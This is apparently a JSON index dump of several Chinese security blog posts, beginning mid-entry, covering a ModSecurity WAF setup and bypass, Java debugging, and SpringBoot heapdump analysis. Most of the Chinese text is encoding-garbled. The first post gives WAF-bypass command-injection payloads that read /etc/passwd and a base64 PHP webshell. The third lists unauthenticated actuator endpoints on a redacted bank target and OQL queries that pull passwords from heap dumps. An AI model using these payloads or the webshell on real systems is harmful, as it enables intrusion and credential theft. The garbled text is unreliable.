·çš„ã€æ€ä¹ˆå¾—æ¥çš„ï¼Œå…ˆæ‹¿æ¥ç”¨ã€‚ã€Œæ‹¿æ¥ä¸»ä¹‰ã€ï¼šæ˜¯æ°‘å›½æ—¶æœŸé¢å¯¹å¤–æ¥æ–‡åŒ–çš„å†²å‡»å’Œä¸­å›½å°å»ºæ—¶ä»£é—ç•™ä¸‹æ¥çš„æ–‡åŒ–ï¼Œå¦‚ä½•é€‰æ‹©å’Œå–èˆï¼Œäºå½“æ—¶ä¸­å›½æµè¡Œçš„é—­å…³ä¸»ä¹‰å’Œå…¨é¢è¥¿åŒ–çš„ä¸åŒå‘¼å£°ï¼›é²è¿…ä¸»å¼ ï¼Œæ—¢éè¢«åŠ¨åœ°è¢«â€œé€å»â€ï¼Œäº¦éä¸åŠ åˆ†æåœ°â€œæ‹¿æ¥â€ï¼Œè€Œæ˜¯é€šè¿‡å®ç”¨ä¸»ä¹‰çš„è§‚ç‚¹é€‰æ‹©æ€§çš„â€œæ‹¿æ¥â€ã€‚æ‰€ä»¥æˆ‘æƒ³ï¼šé’ˆå¯¹WAFä¹Ÿå¯ä»¥è¿™æ ·æ¥å­¦ä¹ ï¼Œä¸çŸ¥é“WAFçš„å·¥ä½œåŸç†æ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬å…ˆæŠŠå¼€æºçš„WAFæ‹¿è¿‡æ¥ç”¨ï¼Œç”¨äº†æ‰çŸ¥é“WAFçš„ä¼˜ç‚¹ã€ç¼ºç‚¹ï¼›åŒæ ·çš„ï¼šåªæœ‰ç”¨è¿‡ä¹‹åï¼Œæˆ‘ä»¬çœ‹åˆ°æ‹¦æˆªæ—¥å¿—åå¯ä»¥çŸ¥é“WAFçš„æ­£åˆ™è¡¨è¾¾è§„åˆ™åº“ï¼Œå¯ä»¥å¯¹WAFçš„å·¥ä½œæ–¹å¼æœ‰ä¸€äº›äº†è§£ã€‚0x02éƒ¨ç½²WAF#Apacheéƒ¨ç½²è¿›ä¸€æ­¥äº†è§£ï¼šAPACHEä¸­é—´ä»¶é“¾æ¥ModSecæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œè·Ÿç€æ•™ç¨‹ä¸€æ­¥æ­¥èµ°åŸºæœ¬ä¸Šéƒ½èƒ½æå®šã€‚ç›´æ¥ä¸Šéƒ¨ç½²æˆåŠŸçš„å›¾ï¼šå¦‚ä¸Šå›¾ï¼Œéƒ¨ç½²æˆåŠŸåå¯ä»¥çœ‹åˆ°è®¿é—®http://localhost?doc=/bin/lsï¼ŒWAFç»™å‡ºæ‹¦æˆªæ“ä½œï¼Œæ—¥å¿—è®°å½•æç¤ºè§¦å‘äº†unix-shell.dataè§„åˆ™å¯¼è‡´æ‹¦æˆªè¿”å›403ï¼›#Nginxéƒ¨ç½²è¿›ä¸€æ­¥äº†è§£ï¼šNginxä¸­é—´ä»¶é“¾æ¥ModSecåŒæ ·çš„ï¼šè®¿é—®localhost:8011/?and1=2--+ï¼Œè§¦å‘WAFæ‹¦æˆªè§„åˆ™è¿”å›403ï¼›éœ€è¦æ³¨æ„çš„æ˜¯ï¼šnginxç‰ˆæœ¬ï¼Œæ•™ç¨‹ä¸­æ¨èçš„1.9ç‰ˆæœ¬å®é™…æ“ä½œä¸‹æ¥æ— æ³•æˆåŠŸç¼–è¯‘å®‰è£…ï¼Œè¿™é‡Œæ¨ènginx/1.13.8wgethttp://nginx.org/download/nginx-1.13.8.tar.gzç¯å¢ƒlibåº“å®‰è£…ï¼šsudoapt-getinstallopenssllibssl-devlibpcre3libpcre3-devzlib1g-devautoconfautomakelibtoolgccg++make#[tips]ä»¥ä¸‹å››æ¡å‘½ä»¤çš„å«ä¹‰ï¼š$sed-ie's/SecDefaultAction\"phase:1,log,auditlog,pass\"/#SecDefaultAction\"phase:1,log,auditlog,pass\"/g'crs-setup.conf$sed-ie's/SecDefaultAction\"phase:2,log,auditlog,pass\"/#SecDefaultAction\"phase:2,log,auditlog,pass\"/g'crs-setup.conf$sed-ie's/#.*SecDefaultAction\"phase:1,log,auditlog,deny,status:403\"/SecDefaultAction\"phase:1,log,auditlog,deny,status:403\"/g'crs-setup.conf$sed-ie's/#SecDefaultAction\"phase:2,log,auditlog,deny,status:403\"/SecDefaultAction\"phase:2,log,auditlog,deny,status:403\"/g'crs-setup.confå°†ä¸‹é¢æŸ¥çœ‹crs-setup.confæ–‡ä»¶è¾“å‡ºä¸­1ã€2è¡Œï¼ˆä¸‹æ–‡2ã€3è¡Œï¼‰çš„å†…å®¹æ³¨é‡Šï¼Œæ–‡ä»¶ä¸­5ã€6è¡Œï¼ˆä¸‹æ–‡6ã€7è¡Œï¼‰å–æ¶ˆæ³¨é‡Šï¼›catcrs-setup.conf|grepSecDefaultAction#SecDefaultAction\"phase:1,log,auditlog,pass\"#SecDefaultAction\"phase:2,log,auditlog,pass\"#SecDefaultAction\"phase:1,nolog,auditlog,pass\"#SecDefaultAction\"phase:2,nolog,auditlog,pass\"SecDefaultAction\"phase:1,log,auditlog,deny,status:403\"SecDefaultAction\"phase:2,log,auditlog,deny,status:403\"#SecDefaultAction\"phase:1,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host:%{request_headers.host}'\"#SecDefaultAction\"phase:2,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host:%{request_headers.host}'\"å…¶ä»–æ ¹æ®æ•™ç¨‹å¾€ä¸‹èµ°å³å¯ã€‚0x03ç»•è¿‡WAF#æœªåˆå§‹å˜é‡è¿›è¡Œç»•è¿‡è·Ÿéšå¤§ä½¬ä»¬çš„è„šæ­¥èµ°ï¼Œä½¿ç”¨ç®€å•çš„phpä»£ç è¿›è¡ŒWAFæµ‹è¯•ï¼š&lt;?phpif(isset($_GET['host'])){system('dig'.$_GET['host']);}?&gt;å¦‚ä¸Šä»£ç å°è¯•ç»•è¿‡WAFã€‚æˆ‘ä»¬çŸ¥é“ç»ˆç«¯æ‰§è¡Œdigwww.baidu.com;cat/etc/passwdå®é™…æ‰§è¡Œå¦‚ä¸‹ï¼šdigwww.baidu.com;cat/etc/passwd;&lt;&lt;&gt;&gt;DiG9.10.6&lt;&lt;&gt;&gt;www.baidu.com;;globaloptions:+cmd;;Gotanswer:;;-&gt;&gt;HEADER&lt;&lt;-opcode:QUERY,status:NOERROR,id:27659;;flags:qrrd;QUERY:1,ANSWER:3,AUTHORITY:5,ADDITIONAL:4;;WARNING:recursionrequestedbutnotavailableÂ·Â·Â·Â·Â·Â·Â·Â·Â·#OpenDirectory.##nobody:*:-2:-2:UnprivilegedUser:/var/empty:/usr/bin/falseÂ·Â·Â·Â·_oahd:*:441:441:OAHDaemon:/var/empty:/usr/bin/falseåœ¨ç»ˆç«¯ä¸‹ç›¸åŒä½œç”¨çš„é“¾æ¥ç¬¦å·è¿˜æœ‰&amp;&amp;ï¼›ç›´æ¥ä¼ å‚www.baidu.com;cat+/etc/passwdæ³¨å…¥æ˜æ˜¾çš„æ”»å‡»è¡Œä¸ºç›´æ¥è¿”å›403ï¼ŒæŸ¥çœ‹æ—¥å¿—åŒ¹é…åˆ°ä»¥ä¸‹ç‰¹å¾ï¼š1ã€\"OperatorRx'withparameter^[\\d.:]+$'againstvariableï¼Œå­˜åœ¨è¿ç®—ç¬¦ï¼›2ã€OperatorPmFromFile'withparameterlfi-os-files.data'ï¼Œæ­£åˆ™åŒ¹é…åˆ°lfi-os-filesçš„è§„åˆ™åº“ï¼›3ã€charactersomittedï¼Œç‰¹æ®Šå­—ç¬¦ï¼›4ã€\"OperatorPmFromFile'withparameterunix-shell.data'ï¼Œæ­£åˆ™åŒ¹é…åˆ°unix-shellçš„è§„åˆ™åº“ï¼›5ã€OperatorGe'withparameter5'ï¼ŒåŒæ ·ä¸ºå­˜åœ¨è¿ç®—ç¬¦ã€‚æ‰€ä»¥æ ¹æ®ä»¥ä¸Šç‰¹å¾è¿›è¡Œè§„åˆ™æ¢æµ‹å¹¶æ³¨å…¥fuzzï¼š+$u+cat+/$uetc/$upasswd$u+$ucat+$u/etc$u/passwdä»¥ä¸Šéƒ½è¿”å›200ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜å‘½ä»¤å†™çš„ä¸å¯¹ï¼›å®é™…æµ‹è¯•/etcã€/passwdå’Œç‰¹æ®Šå­—ç¬¦ç­‰ä¸èƒ½å•ç‹¬å‡ºç°ï¼Œæ‰€ä»¥ä½¿ç”¨æœªåˆå§‹å˜é‡$uåŒ…ä½åè¿›è¡Œæ³¨å…¥ï¼›ä¸‹é¢æ˜¯å®é™…ç”Ÿæ•ˆçš„payloadï¼š+$u+cat+/etc$u/passwd$u+$u+cat+$u/etc$u/passwdä¸€ï¼šç¼–å†™pocè„šæœ¬è¿æ¥å™¨é€šè¿‡ä»¥ä¸Šç»•è¿‡é¦–å‘å³å¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æœ¬æ®µçš„é‡ç‚¹ï¼›æœ¬æ®µçš„é‡ç‚¹æ˜¯é€šè¿‡å®é™…æµ‹è¯•å‘ç°base64ç¼–ç åå¯ä»¥å®Œç¾ç»•è¿‡wafï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å†™å…¥ä¸€ä¸ªbase64çš„é©¬ï¼Œç„¶åè¿æ¥ï¼Œå®é™…ä¸Šå°±æ˜¯è§£å†³å®ç°ä¸€ä¸ªwebshellè¿æ¥å™¨ï¼Œå®ç°åŠŸèƒ½ç±»ä¼¼ä¸€ä¸ªèšå‰‘çš„cmdè¿æ¥åŠŸèƒ½ï¼›è¿™æ ·ä»¥æ¥WAFå°±å½¢åŒè™šè®¾äº†ã€‚webshellä»£ç ï¼š&lt;?phpsystem(base64_decode($_GET['CMD']));?&gt;GET/POSTè¯·æ±‚ä¼ å…¥cmdbase64åŠ å¯†å‚æ•°å†…å®¹ç±»ä¼¼ç»ˆç«¯æ‰§è¡Œä»£ç å®ç°æ•ˆæœå¦‚ä¸‹ï¼šå‚è€ƒçš„æ˜¯[@IppSec]çš„ä»£ç ï¼Œç®€å•ä¿®æ”¹äº†éƒ¨åˆ†ã€‚å‚è€ƒä»£ç ä»¥ä¸Š"
  },

  {
    "title"    : "Dynamic-analysis-of-java-framework-code",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Dynamic-analysis-of-java-framework-code/",
    "date"     : "Dec 30, 2020",
    "content"  : "é›¶ï¼š[debug]theworlddebugåŸºæœ¬ç”¨æ³•ä»‹ç»debugçš„å‡ ä¸ªåˆ†ç±»æ–­ç‚¹ä»‹ç»åˆ†ç±»æ–­ç‚¹çš„ä½¿ç”¨debugç®€å•ä¾‹å­æ¼”ç¤ºä»¥SHIROæ¡†æ¶æ¥è¿›è¡ŒåŠ¨æ€javaä»£ç è°ƒè¯•åˆ†æ0x01ï¼šdebugçš„åŸºæœ¬ç”¨æ³•0x02ï¼šdebugå®ç°linebreakpointsäº†è§£äº†æ€ä¹ˆè°ƒè¯•åï¼Œç¬¬ä¸€æ­¥ï¼šdebugtheworldã€‚1.æ–°å»ºç¨‹åºæ‰“å¼€å¼€å‘è½¯ä»¶(intelliJIDEAæˆ–è€…eclipse)æ–°å»ºprojectnewä¸€ä¸ªclasshello.java:publicclasshello{publicstaticvoidmain(String[]args){System.out.println(\"thisisablocktestmessage\");System.out.println(\"helloworld\");}}2.è¿è¡Œç¨‹åº${path-to-project}/hello/src/hello.java-å³é”®-runhello.main()consoleå°è¾“å‡ºå³ç¨‹åºè¿è¡ŒæˆåŠŸï¼šÂ·Â·Â·Â·Â·Â·thisisablocktestmessagehelloworldProcessfinishedwithexitcode03.è°ƒè¯•ç¨‹åºå®ç°ç°è±¡ï¼š1)ç¨‹åºè¾“å‡ºthisisablocktestmessageååœä¸‹2)äººå·¥å¹²é¢„åè¾“å‡ºhelloworldå°±è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨å¯¹ä¸€ä¸ªç®€å•çš„javaç¨‹åºè¿›è¡Œè¿›ç¨‹æ–­ç‚¹åï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå¯¹ç¨‹åºçš„è¾“å‡ºçš„è¿›åº¦å¯æ§ã€‚äºŒï¼šæ–­ç‚¹ç”¨æ³•0x01ï¼š"
  },

  {
    "title"    : "SpringBoot-Memory-files-heapdump-Analysis",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/SpringBoot-Memory-files-heapdump-Analysis/",
    "date"     : "Nov 24, 2020",
    "content"  : "æ€è·¯ï¼šheapdumpæ–‡ä»¶åˆ†æå†ç¨‹æœ¬æ–‡é€šè¿‡ä¸‹é¢ä¸‰ä¸ªé—®é¢˜è¿›è¡ŒæŠ€æœ¯åˆ†äº«ï¼šåœ¨å“ªäº›åœ°æ–¹å¯ä»¥å‘ç°ï¼Ÿå…³äºSpringBootçš„ä¸€äº›å‚è€ƒSpringBootæ¡†æ¶æ¸—é€å‚è€ƒå‘ç°äº†æ€ä¹ˆæ‰¾åˆ°å¥¹ï¼Ÿheapdumpæ–‡ä»¶ä¸‹è½½è·¯ç”±springbootv1ç‰ˆæœ¬ï¼šhttps://url-to-spring-boot-error/heapdumpspringbootv2ç‰ˆæœ¬ï¼šhttps://url-to-spring-boot-error/actuator/heapdumpå®é™…æƒ…å†µä¸­ä¸åŒçš„ç”Ÿäº§ç¯å¢ƒæœ‰æ‰€å·®å¼‚ï¼Œæ‰€ä»¥å»ºè®®é’ˆå¯¹actuatorç»“ç‚¹ä½œä¸ºåˆ†å‰²ç‚¹æ¥è¿›è¡Œåˆ¤åˆ«ï¼Œå³æ ‡è¯†é”™è¯¯é¡µé¢å‡ºç°çš„è·¯ç”±æ¥è¿›è¡Œå±‚çº§çˆ†ç ´ï¼Œè‹¥æ²¡æœ‰åˆ†å‰²ç‚¹å³springbootv1ç‰ˆæœ¬åˆ™å¾€å‰é€’æ¨ä¸€ä¸ªè·¯ç”±å³å¯ã€‚æ‰¾åˆ°äº†æ€ä¹ˆä½¿ç”¨ï¼Ÿæ–‡ä»¶åˆ†æåˆ†æå·¥å…·MATåˆ†æè¯­æ³•åˆ†æé›¶ï¼šSpringâ€”Bootæ¡†æ¶çš„æ¸—é€è¿‡ç¨‹ä¸Šé¢å·²ç»ç»™å‡ºç›¸å…³è®¿é—®urlï¼Œæ–‡ç« ä¸­çš„è½¬è½½åœ°å€ä¹Ÿè¯¦ç»†ç»™å‡ºï¼Œä¸€èˆ¬èƒ½å¤Ÿè¯†åˆ«Spring-Bootçš„æ¡†æ¶ç‰¹å¾å°±è¡Œäº†ï¼Œä¸å†èµ˜è¿°ã€‚æœ¬ç¯‡æ–‡ç« ä¸»è¦æ˜¯é’ˆå¯¹heapdumpæ–‡ä»¶è¿›è¡Œåˆ†æï¼›åœ¨è¿™é‡Œåšä¸€ä¸‹ç®€å•çš„ä»‹ç»ï¼šé›¶ï¼šè·¯ç”±å’Œç‰ˆæœ¬0x01ï¼šè·¯ç”±çŸ¥è¯†0x02ï¼šç‰ˆæœ¬çŸ¥è¯†ä¸€ï¼šä¿¡æ¯æ³„éœ²0x01ï¼šè·¯ç”±åœ°å€åŠæ¥å£è°ƒç”¨è¯¦æƒ…æ³„æ¼0x02ï¼šé…ç½®ä¸å½“è€Œæš´éœ²çš„è·¯ç”±0x03ï¼šè·å–è¢«æ˜Ÿå·è„±æ•çš„å¯†ç çš„æ˜æ–‡äºŒï¼šè¿œç¨‹ä»£ç æ‰§è¡Œ0x01ï¼šwhitelabelerrorpageSpELRCE0x02ï¼šspringcloudSnakeYAMLRCE0x03ï¼šeurekaxstreamdeserializationRCE0x04ï¼šjolokialogbackJNDIRCE0x05ï¼šjolokiaRealmJNDIRCE0x06ï¼šh2databasequeryRCE0x07ï¼šh2databaseconsoleJNDIRCE0x08ï¼šmysqljdbcdeserializationRCEä¸€ï¼šå†å²SpringBootæ¡†æ¶æ¸—é€åœ¨ç®€å•è®¤è¯†SpringBootæ¡†æ¶åï¼Œè‡³å°‘åœ¨æˆ‘çœ‹æ¥ï¼Œæˆ‘ä»¬æ‰€éœ€è¦äº†è§£çš„æ˜¯æ¡†æ¶çš„è·¯ç”±ã€ç‰¹å¾ä¿¡æ¯ï¼Œä»¥æ–¹ä¾¿æˆ‘ä»¬æ¥è¯†åˆ«ï¼›å½“ç„¶ï¼Œè‡ªå·±æ­å»ºä¸€éå¯¹äºæ¡†æ¶çš„è®¤è¯†è‡ªä¸å¿…å¤šè¯´ã€‚è€Œåœ¨æˆ‘çœ‹æ¥ï¼Œä»…ä»…ä¸€ç¯‡åšå®¢çš„ç®€å•æè¿°å¹¶ä¸èƒ½ä¸€è¨€æ¦‚å…¨ï¼Œè€Œä¸”ç”±äºå®‰å…¨è¡Œä¸šçš„ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬æ›´éœ€è¦çš„æ˜¯è„šè¸å®åœ°çš„å®è·µç²¾ç¥ï¼Œæ‰€ä»¥åœ¨æ­¤å†™ä¸‹åšå®¢çš„åŒæ—¶ï¼Œå›å¿†SRCçš„ç›¸å…³æ¡ˆä¾‹ï¼›æƒå½“æŠ›ç –å¼•ç‰1x01é‡‘èè¡Œä¸šæŸé“¶è¡Œç³»ç»Ÿç”±äºæ—¶é—´è¾ƒä¸ºä¹…è¿œï¼Œç»†èŠ‚éƒ¨åˆ†æ— æ³•è¯¦å°½è´´å‡ºï¼Œä½†æ˜¯ä¸å¦¨ç¢æ•´ä½“å®Œæ•´æ€§ï¼›ä¸ºäº†ä¿æŠ¤SRCå¹³å°å®¢æˆ·éšç§ï¼Œæ‰€æœ‰çš„è·¯ç”±ã€ipå…¨éƒ¨éƒ½ä½¿ç”¨å¯ç†è§£çš„æ ‡ç­¾ä»£æ›¿ã€‚è§è°…ã€‚SRCä»»åŠ¡æ˜¯æ³›åŸŸåï¼Œå°±æ˜¯*.src_target.{com}ï¼ŒåŸºæœ¬ç†Ÿæ‚‰çš„å°±ç›´æ¥è·‘åŸŸåç„¶åç«¯å£å¯¹åº”çš„æœåŠ¡è¿™æ ·å­ï¼›å­åŸŸåå‘ç°å­åŸŸåæ•´ç†ç«¯å£æ‰¹é‡æ‰«æåŸŸåç«¯å£æ‰¹é‡æœåŠ¡å‘ç°è¿‡ç¨‹ä¸­å‘ç°æŸé“¶è¡Œæœºæ„æ´»åŠ¨ç™»å½•ç³»ç»Ÿ1ã€ç™»å½•æ•°æ®åŒ…ä¸ºjsonæ ¼å¼2ã€ç™»å½•ç³»ç»Ÿç«¯å£ä¸º8080ï¼Œåç«¯éªŒè¯ç³»ç»ŸæœåŠ¡å¼€æ”¾ç«¯å£ä¸º8086ï¼Œè·¯ç”±å¦‚ä¸‹ï¼šç™»å½•ï¼šhttp://{Vuln_Address}:8080/user/login?redirect=%2FéªŒè¯æ•°æ®äº¤äº’ï¼šhttp://{Vuln_Address}:8086/{api_interface_url}/sys/login/è®¿é—®åç«¯8086å¼€æ”¾æœåŠ¡urlï¼šhttp://{Vuln_Address}:8086/{api_interface_url}/å‘ç°è¿”å›404ï¼Œè¿”å›ä¿¡æ¯å¦‚ä¸‹ï¼šjsonæ ¼å¼ï¼š{\"timestamp\":\"2021-01-29T07:26:34.085+0000\",\"status\":404,\"error\":\"NotFound\",\"message\":\"Nomessageavailable\",\"path\":\"/\"}htmlæ ¼å¼ï¼š&lt;html&gt;&lt;body&gt;&lt;h1&gt;WhitelabelErrorPage&lt;/h1&gt;&lt;p&gt;Thisapplicationhasnoexplicitmappingfor/error,soyouareseeingthisasafallback.&lt;/p&gt;&lt;divid='created'&gt;FriJan2915:25:38CST2021&lt;/div&gt;&lt;div&gt;Therewasanunexpectederror(type=NotFound,status=404).&lt;/div&gt;&lt;div&gt;Nomessageavailable&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;å¾ˆæ˜æ˜¾çš„SpringBootæ¡†æ¶ï¼Œè¿è·¯ç”±éƒ½ä¸éœ€è¦çˆ†ç ´ç›´æ¥æ‰¾æœªæˆæƒæ¥å£ï¼šIt'sASpringBootWebAPP:http://{Vuln_Address}:8086/ç›®æ ‡ç«™ç‚¹å¼€å¯äº†envç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/envç›®æ ‡ç«™ç‚¹å¼€å¯äº†jolokiaç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/jolokia/listç›®æ ‡ç«™ç‚¹å¼€å¯äº†jolokiaç«¯ç‚¹ä¸”å­˜åœ¨createJNDIRealmæ–¹æ³•,å¯è¿›è¡ŒJNDIæ³¨å…¥RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/jolokia/listç›®æ ‡ç«™ç‚¹å¼€å¯äº†beansç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/beansç›®æ ‡ç«™ç‚¹å¼€å¯äº†configpropsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/configpropsç›®æ ‡ç«™ç‚¹å¼€å¯äº†healthç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/healthç›®æ ‡ç«™ç‚¹å¼€å¯äº†infoç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/infoç›®æ ‡ç«™ç‚¹å¼€å¯äº†mappingsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/mappingsç›®æ ‡ç«™ç‚¹å¼€å¯äº†metricsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086//actuator/metrics---It'sASpringBootWebAPP:http://{Vuln_Address}:8086/{api_interface_url1}/actuatorç›®æ ‡ç«™ç‚¹å¼€å¯äº†envç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/envç›®æ ‡ç«™ç‚¹å¼€å¯äº†jolokiaç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/jolokia/listç›®æ ‡ç«™ç‚¹å¼€å¯äº†jolokiaç«¯ç‚¹ä¸”å­˜åœ¨createJNDIRealmæ–¹æ³•,å¯è¿›è¡ŒJNDIæ³¨å…¥RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/jolokia/listç›®æ ‡ç«™ç‚¹å¼€å¯äº†beansç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/beansç›®æ ‡ç«™ç‚¹å¼€å¯äº†configpropsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/configpropsç›®æ ‡ç«™ç‚¹å¼€å¯äº†healthç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/healthç›®æ ‡ç«™ç‚¹å¼€å¯äº†infoç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/infoç›®æ ‡ç«™ç‚¹å¼€å¯äº†mappingsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/mappingsç›®æ ‡ç«™ç‚¹å¼€å¯äº†metricsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/metrics---It'sASpringBootWebAPP:http://{Vuln_Address}:8086/{api_interface_url2}/actuatorç›®æ ‡ç«™ç‚¹å¼€å¯äº†envç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/envç›®æ ‡ç«™ç‚¹å¼€å¯äº†jolokiaç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/jolokia/listç›®æ ‡ç«™ç‚¹å¼€å¯äº†jolokiaç«¯ç‚¹ä¸”å­˜åœ¨createJNDIRealmæ–¹æ³•,å¯è¿›è¡ŒJNDIæ³¨å…¥RCEæµ‹è¯•,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/jolokia/listç›®æ ‡ç«™ç‚¹å¼€å¯äº†beansç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/beansç›®æ ‡ç«™ç‚¹å¼€å¯äº†configpropsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/configpropsç›®æ ‡ç«™ç‚¹å¼€å¯äº†healthç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/healthç›®æ ‡ç«™ç‚¹å¼€å¯äº†infoç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/infoç›®æ ‡ç«™ç‚¹å¼€å¯äº†mappingsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/mappingsç›®æ ‡ç«™ç‚¹å¼€å¯äº†metricsç«¯ç‚¹çš„æœªæˆæƒè®¿é—®,è·¯å¾„ä¸ºï¼šhttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/metricsè€Œæˆ‘ä»¬ä»ä¸Šé¢ä¿¡æ¯å¯çŸ¥ï¼Œå­˜åœ¨çš„SpringBootè·¯ç”±åˆ†åˆ«ä¸ºï¼šæ ¹ç›®å½•/ã€{api_interface_url1}ã€{api_interface_url2}ï¼Œæ‰€ä»¥è¨€å½’æ­£ä¼ ï¼Œè¿”å›åˆ°æˆ‘ä»¬çš„ä¸»è§’ï¼šheapdumpä¸‹è½½è·¯å¾„å³ï¼šhttp://{Vuln_Address}:8086/actuator/heapdumphttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/heapdumphttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/heapdumpå½“ç„¶ï¼Œæ‰€æœ‰çš„æ¸—é€æ“ä½œéƒ½æ˜¯åœ¨æ­¤ç«¯å£ä¸Šè¿›è¡Œï¼›ç»§ç»­å¾€ä¸‹ã€‚äºŒï¼šHEAPDUMPæ–‡ä»¶åˆ†æå†ç¨‹æ–‡ä»¶ä¿¡æ¯å¦‚ä¸‹ï¼š%filesrc-1520-heapdumpsrc-1520-heapdump:JavaHPROFdump,createdMonOct1211:14:252020FileViewer:2x01åˆ†æå·¥å…·MATOQLæ˜¯ç”¨äºæŸ¥è¯¢Javaå †çš„ç±»SQLæŸ¥è¯¢è¯­è¨€ã€‚OQLå…è®¸è¿‡æ»¤/é€‰æ‹©ä»Javaå †ä¸­è·å–çš„ä¿¡æ¯ï¼›è™½ç„¶HATå·²ç»æ”¯æŒé¢„å®šä¹‰çš„æŸ¥è¯¢ï¼Œä¾‹å¦‚â€œæ˜¾ç¤ºç±»Xçš„æ‰€æœ‰å®ä¾‹â€ï¼Œä½†OQLå¢åŠ äº†æ›´å¤šçš„çµæ´»æ€§ï¼›OQLåŸºäºJavaScriptè¡¨è¾¾å¼è¯­è¨€ã€‚æ‰“å¼€MATé€‰æ‹©æ‰“å¼€headumpæ–‡ä»¶ï¼Œæ‰“å¼€åŠ è½½å®Œæ¯•é€‰æ‹©OQLæ‰§è¡Œï¼›2x02åˆ†æè¯­æ³•select&lt;JavaScriptexpressiontoselect&gt;[from[instanceof]&lt;classname&gt;&lt;identifier&gt;[where&lt;JavaScriptbooleanexpressiontofilter&gt;]]éƒ¨åˆ†OQLåˆ†æè¯­å¥å®ä¾‹å±•ç¤ºï¼šselect*fromjava.util.LinkedHashMap$EntryxWHERE(toString(x.key).contains(\"password\"))é€‰æ‹©å¯»æ‰¾hashmapä¸­æ‰€æœ‰keyå…ƒç´ 